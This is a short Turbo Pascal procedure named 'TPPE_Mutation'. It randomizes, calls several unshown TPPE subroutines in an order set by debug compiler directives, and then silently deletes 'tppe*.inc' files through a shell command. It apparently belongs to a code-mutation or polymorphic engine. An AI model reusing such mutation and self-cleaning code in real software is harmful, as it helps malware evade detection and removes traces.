   procedure TPPE_Mutation;
   begin
   Randomize;
   Dummy:=0;
   TPPE_1;
   TPPE_2;
   {$IFOPT D+}TPPE_3;{$ENDIF}
   TPPE_5;
   {$IFOPT D-}TPPE_3;{$ENDIF}
   TPPE_6;
   exec(Command,'/c del tppe*.inc>nul');
   end;
